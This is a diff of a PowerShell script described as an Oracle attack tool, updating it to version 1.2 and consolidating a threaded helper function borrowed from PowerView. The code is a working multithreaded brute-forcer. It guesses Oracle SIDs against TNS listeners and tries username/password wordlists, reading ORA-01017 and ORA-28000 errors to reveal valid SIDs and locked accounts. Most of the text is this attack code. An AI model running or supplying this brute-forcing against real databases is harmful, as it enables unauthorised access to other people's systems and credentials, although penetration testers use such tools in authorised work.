@@ -2,7 +2,7 @@
 .SYNOPSIS
 
 Author: Andrew Bonstrom (@ch33kyf3ll0w)
-Version: 1.1
+Version: 1.2
 
 .DESCRIPTION
 An Oracle attack tool written in PowerShell and using the .NET OracleClient. Can be used to bruteforce SIDs, Username/Passwords, and to execute queries.
@@ -48,7 +48,7 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
         Param(
         [Parameter(Mandatory = $false)]
         [string]$HostName,
-	[Parameter(Mandatory = $false)]
+		[Parameter(Mandatory = $false)]
         [string]$HostList,
         [Parameter(Mandatory = $True)]
         [string]$HostPort,   
@@ -56,8 +56,8 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
         [string]$SID,
         [Parameter(Mandatory = $false)]
         [string]$SIDList,
-	[Parameter(Mandatory = $false)]
-	[Int]$Threads = 20
+		[Parameter(Mandatory = $false)]
+		[Int]$Threads = 20
 )
 
 		#Initialize Arrays
@@ -91,11 +91,11 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 		
 		#Create script block
 		$oracleScriptBlock = {
-			param($ComputerName, $HostPort, $sidWordList)
+			param($iterator, $HostPort, $sidWordList)
 			foreach ($s in $sidWordList){
 			###########################################################
 			#Creates connection string to use for targeted TNSListener
-			$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$ComputerName)(Port=$HostPort)))(CONNECT_DATA=(SID=$s)));"
+			$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$iterator)(Port=$HostPort)))(CONNECT_DATA=(SID=$s)));"
 			#Creates new object with oracle client .net class using created connection string
 			$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)
 
@@ -112,17 +112,17 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 				$ErrorMessage = $_.Exception.Message
 				#01017 is the ORA exception that implies failed username/password. Cannot get to this phase without valid SID, therefore the existence of 01017 implies correct SID
 				if ($ErrorMessage -match "01017"){
-					Write-Host -Object "[+] $s for the TNS listener at $ComputerName is valid!" -ForegroundColor 'green'
+					Write-Host -Object "[+] $s for the TNS listener at $iterator is valid!" -ForegroundColor 'green'
 				}
 				else{
-					Write-Host  -Object "[-] $s is invalid for the TNS listener at $ComputerName." -ForegroundColor 'red'
+					Write-Host  -Object "[-] $s is invalid for the TNS listener at $iterator." -ForegroundColor 'red'
 				}
         
 				#Close connection
 				$conn.Close()
 			}
 			}		
-		
+		$Result
 		
 		}
             # Establish parameters to pass to Invoke-ThreadedFunction
@@ -130,154 +130,9 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
                 'HostPort' = $HostPort
                 'sidWordList' = $sidWordList
             }
-#########################################################################################################################
-#
-# Helper function taken straight from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
-#
-#########################################################################################################################
 
-function Invoke-ThreadedFunction {
-    # Helper used by any threaded host enumeration functions
-    [CmdletBinding()]
-    param(
-        [Parameter(Position=0,Mandatory=$True)]
-        [String[]]
-        $ComputerName,
-
-        [Parameter(Position=1,Mandatory=$True)]
-        [System.Management.Automation.ScriptBlock]
-        $ScriptBlock,
-
-        [Parameter(Position=2)]
-        [Hashtable]
-        $ScriptParameters,
-
-        [Int]
-        $Threads = 20,
-
-        [Switch]
-        $NoImports
-    )
-
-    begin {
-
-        if ($PSBoundParameters['Debug']) {
-            $DebugPreference = 'Continue'
-        }
-
-        Write-Verbose "[*] Total number of hosts: $($ComputerName.count)"
-
-
-        # Adapted from:
-        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
-        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
-        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
-
-        # import the current session state's variables and functions so the chained PowerView
-        #   functionality can be used by the threaded blocks
-        if(!$NoImports) {
-
-            # grab all the current variables for this runspace
-            $MyVars = Get-Variable -Scope 2
-
-            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
-            $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
-
-            # Add Variables from Parent Scope (current runspace) into the InitialSessionState
-            ForEach($Var in $MyVars) {
-                if($VorbiddenVars -NotContains $Var.Name) {
-                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
-                }
-            }
-
-            # Add Functions from current runspace to the InitialSessionState
-            ForEach($Function in (Get-ChildItem Function:)) {
-                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
-            }
-        }
-
-        # threading adapted from
-        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
-        #   Thanks Carlos!
-
-        # create a pool of maxThread runspaces
-        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
-        $Pool.Open()
-
-        $Jobs = @()
-        $PS = @()
-        $Wait = @()
-
-        $Counter = 0
-    }
-    process {
-
-        ForEach ($Computer in $ComputerName) {
-
-            # make sure we get a server name
-            if ($Computer -ne '') {
-                # Write-Verbose "[*] Enumerating server $Computer ($($Counter+1) of $($ComputerName.count))"
-
-                While ($($Pool.GetAvailableRunspaces()) -le 0) {
-                    Start-Sleep -MilliSeconds 500
-                }
-
-                # create a "powershell pipeline runner"
-                $PS += [powershell]::create()
-
-                $PS[$Counter].runspacepool = $Pool
-
-                # add the script block + arguments
-                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter('ComputerName', $Computer)
-                if($ScriptParameters) {
-                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
-                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
-                    }
-                }
-
-                # start job
-                $Jobs += $PS[$Counter].BeginInvoke();
-
-                # store wait handles for WaitForAll call
-                $Wait += $Jobs[$Counter].AsyncWaitHandle
-            }
-            $Counter = $Counter + 1
-        }
-    }
-
-    end {
-
-        Write-Verbose "Waiting for scanning threads to finish..."
-
-        $WaitTimeout = Get-Date
-
-        # set a 60 second timeout for the scanning threads
-        while ($($Jobs | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60) {
-                Start-Sleep -MilliSeconds 500
-            }
-
-        # end async call
-        for ($y = 0; $y -lt $Counter; $y++) {
-
-            try {
-                # complete async job
-                $PS[$y].EndInvoke($Jobs[$y])
-
-            } catch {
-                Write-Warning "error: $_"
-            }
-            finally {
-                $PS[$y].Dispose()
-            }
-        }
-        
-        $Pool.Dispose()
-        Write-Verbose "All threads completed!"
-    }
-}
-        # kick off the threaded script block + arguments 
-        Invoke-ThreadedFunction -ComputerName $HostTargetList -Threads $Threads -ScriptBlock $oracleScriptBlock -ScriptParameters $ScriptParams	
-
+            # kick off the threaded script block + arguments 	
+			Invoke-ThreadedFunction -iterator $HostTargetList -Threads $Threads -ScriptBlock $oracleScriptBlock -ScriptParameters $ScriptParams					
 }
 
 function Invoke-CredentialGuess {
@@ -332,13 +187,13 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
         [string]$SID,
         [Parameter(Mandatory = $false)]
         [string]$Username,
-	[Parameter(Mandatory = $false)]
+		[Parameter(Mandatory = $false)]
         [string]$UsernameList,
-	[Parameter(Mandatory = $false)]
+		[Parameter(Mandatory = $false)]
         [string]$Password,
         [Parameter(Mandatory = $false)]
         [string]$PasswordList,
-	[Parameter(Mandatory = $false)]
+		[Parameter(Mandatory = $false)]
         [Int]$Threads = 20
 )
         #Loads .NET OracleClient Assembly
@@ -370,17 +225,17 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 		
 		#Create script block
 		$oracleScriptBlock = {
-		param($UserName, $HostName, $HostPort, $SID, $PasswordWordList )
+		param($iterator, $HostName, $HostPort, $SID, $PasswordWordList )
 			foreach ($p in $PasswordWordList){
 				#Creates connection string to use for targeted TNSListener
-				$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$HostName)(Port=$HostPort)))(CONNECT_DATA=(SID=$SID)));User id=$UserName;Password=$p"
+				$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$HostName)(Port=$HostPort)))(CONNECT_DATA=(SID=$SID)));User id=$iterator;Password=$p"
 				#Creates new object with oracle client .net class using created connection string
 				$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)
-
+				
 				try
 				{
 					$conn.Open()
-					Write-Host  -Object "[+] The provided Username $UserName and Password $p were correct!" -ForegroundColor 'green'
+					Write-Host  -Object "[+] The provided Username $iterator and Password $p were correct!" -ForegroundColor 'green'
 				}
 				catch
 				{
@@ -388,12 +243,13 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 					$ErrorMessage = $_.Exception.Message
 					#01017 is the ORA exception that implies failed username/password. 
 					if ($ErrorMessage -match "01017"){
-						Write-Host  -Object "[-] The provided Username $UserName and Password $p were incorrect!" -ForegroundColor 'red'
+						Write-Host  -Object "[-] The provided Username $iterator and Password $p were incorrect!" -ForegroundColor 'red'
 					}
 					elseif ($ErrorMessage -match "28000"){
-						Write-Host  -Object "[*] The provided Username $UserName has a status of Locked Out!" -ForegroundColor 'yellow'
+						Write-Host  -Object "[*] The provided Username $iterator has a status of Locked Out!" -ForegroundColor 'yellow'
 					}
 					else{
+					
 						Write-Host  -Object "[*] Connection Failed. Error: $ErrorMessage" -ForegroundColor 'red'
 					}			
 				}
@@ -409,149 +265,8 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
             'PasswordWordList' = $PasswordWordList
         }	
 		
-#########################################################################################################################
-#
-# Helper function taken straight from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
-#
-#########################################################################################################################
-
-function Invoke-ThreadedFunction {
-    # Helper used by any threaded host enumeration functions
-    [CmdletBinding()]
-    param(
-        [Parameter(Position=0,Mandatory=$True)]
-        [String[]]
-        $UserName,
-
-        [Parameter(Position=1,Mandatory=$True)]
-        [System.Management.Automation.ScriptBlock]
-        $ScriptBlock,
-
-        [Parameter(Position=2)]
-        [Hashtable]
-        $ScriptParameters,
-
-        [Int]
-        $Threads = 20,
-
-        [Switch]
-        $NoImports
-    )
-
-    begin {
-
-        if ($PSBoundParameters['Debug']) {
-            $DebugPreference = 'Continue'
-        }
-
-        # Adapted from:
-        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
-        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
-        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
-
-        # import the current session state's variables and functions so the chained PowerView
-        #   functionality can be used by the threaded blocks
-        if(!$NoImports) {
-
-            # grab all the current variables for this runspace
-            $MyVars = Get-Variable -Scope 2
-
-            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
-            $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
-
-            # Add Variables from Parent Scope (current runspace) into the InitialSessionState
-            ForEach($Var in $MyVars) {
-                if($VorbiddenVars -NotContains $Var.Name) {
-                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
-                }
-            }
-
-            # Add Functions from current runspace to the InitialSessionState
-            ForEach($Function in (Get-ChildItem Function:)) {
-                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
-            }
-        }
-
-        # threading adapted from
-        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
-        #   Thanks Carlos!
-
-        # create a pool of maxThread runspaces
-        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
-        $Pool.Open()
-
-        $Jobs = @()
-        $PS = @()
-        $Wait = @()
-
-        $Counter = 0
-    }
-    process {
-
-        ForEach ($user in $UserName) {
-
-            # make sure we get a server name
-            if ($user -ne '') {
-
-                While ($($Pool.GetAvailableRunspaces()) -le 0) {
-                    Start-Sleep -MilliSeconds 500
-                }
-
-                # create a "powershell pipeline runner"
-                $PS += [powershell]::create()
-
-                $PS[$Counter].runspacepool = $Pool
-
-                # add the script block + arguments
-                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter('UserName', $user)
-                if($ScriptParameters) {
-                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
-                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
-                    }
-                }
-
-                # start job
-                $Jobs += $PS[$Counter].BeginInvoke();
-
-                # store wait handles for WaitForAll call
-                $Wait += $Jobs[$Counter].AsyncWaitHandle
-            }
-            $Counter = $Counter + 1
-        }
-    }
-
-    end {
-
-        Write-Verbose "Waiting for scanning threads to finish..."
-
-        $WaitTimeout = Get-Date
-
-        # set a 60 second timeout for the scanning threads
-        while ($($Jobs | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60) {
-                Start-Sleep -MilliSeconds 500
-            }
-
-        # end async call
-        for ($y = 0; $y -lt $Counter; $y++) {
-
-            try {
-                # complete async job
-                $PS[$y].EndInvoke($Jobs[$y])
-
-            } catch {
-                Write-Warning "error: $_"
-            }
-            finally {
-                $PS[$y].Dispose()
-            }
-        }
-        
-        $Pool.Dispose()
-        Write-Verbose "All threads completed!"
-    }
-}	
-        # kick off the threaded script block + arguments 
-        Invoke-ThreadedFunction -UserName $UsernameWordList -Threads $Threads -ScriptBlock $oracleScriptBlock -ScriptParameters $ScriptParams	
+        # kick off the threaded script block + arguments 	
+	    Invoke-ThreadedFunction -iterator $UsernameWordList -Threads $Threads -ScriptBlock $oracleScriptBlock -ScriptParameters $ScriptParams
 }
 
 function Invoke-QueryExec {
@@ -739,4 +454,149 @@ http://dbatricksworld.com/ora-65096-invalid-common-user-or-role-name-and-ora-650
 		}
 	}
 
+}
+
+#########################################################################################################################
+#
+# Helper function taken straight from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
+#
+#########################################################################################################################
+
+function Invoke-ThreadedFunction {
+    # Helper used by any threaded host enumeration functions
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0,Mandatory=$True)]
+        [String[]]
+        $iterator,
+
+        [Parameter(Position=1,Mandatory=$True)]
+        [System.Management.Automation.ScriptBlock]
+        $ScriptBlock,
+
+        [Parameter(Position=2)]
+        [Hashtable]
+        $ScriptParameters,
+
+        [Int]
+        $Threads = 20,
+
+        [Switch]
+        $NoImports
+    )
+
+    begin {
+
+        if ($PSBoundParameters['Debug']) {
+            $DebugPreference = 'Continue'
+        }
+
+        Write-Verbose "[*] Total number of hosts: $($iterator.count)"
+
+
+        # Adapted from:
+        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
+        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
+        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
+
+        # import the current session state's variables and functions so the chained PowerView
+        #   functionality can be used by the threaded blocks
+        if(!$NoImports) {
+
+            # grab all the current variables for this runspace
+            $MyVars = Get-Variable -Scope 2
+
+            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
+            $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
+
+            # Add Variables from Parent Scope (current runspace) into the InitialSessionState
+            ForEach($Var in $MyVars) {
+                if($VorbiddenVars -NotContains $Var.Name) {
+                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
+                }
+            }
+
+            # Add Functions from current runspace to the InitialSessionState
+            ForEach($Function in (Get-ChildItem Function:)) {
+                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
+            }
+        }
+
+        # threading adapted from
+        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
+        #   Thanks Carlos!
+
+        # create a pool of maxThread runspaces
+        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
+        $Pool.Open()
+
+        $Jobs = @()
+        $PS = @()
+        $Wait = @()
+
+        $Counter = 0
+    }
+    process {
+
+        ForEach ($i in $iterator) {
+
+            # make sure we get a server name
+            if ($iterator -ne '') {
+
+                While ($($Pool.GetAvailableRunspaces()) -le 0) {
+                    Start-Sleep -MilliSeconds 500
+                }
+
+                # create a "powershell pipeline runner"
+                $PS += [powershell]::create()
+
+                $PS[$Counter].runspacepool = $Pool
+
+                # add the script block + arguments
+                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter('iterator', $i)
+                if($ScriptParameters) {
+                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
+                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
+                    }
+                }
+
+                # start job
+                $Jobs += $PS[$Counter].BeginInvoke();
+
+                # store wait handles for WaitForAll call
+                $Wait += $Jobs[$Counter].AsyncWaitHandle
+            }
+            $Counter = $Counter + 1
+        }
+    }
+
+    end {
+
+        Write-Verbose "Waiting for scanning threads to finish..."
+
+        $WaitTimeout = Get-Date
+
+        # set a 60 second timeout for the scanning threads
+        while ($($Jobs | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60) {
+                Start-Sleep -MilliSeconds 500
+            }
+
+        # end async call
+        for ($y = 0; $y -lt $Counter; $y++) {
+
+            try {
+                # complete async job
+                $PS[$y].EndInvoke($Jobs[$y])
+
+            } catch {
+                Write-Warning "error: $_"
+            }
+            finally {
+                $PS[$y].Dispose()
+            }
+        }
+        
+        $Pool.Dispose()
+        Write-Verbose "All threads completed!"
+    }
 }
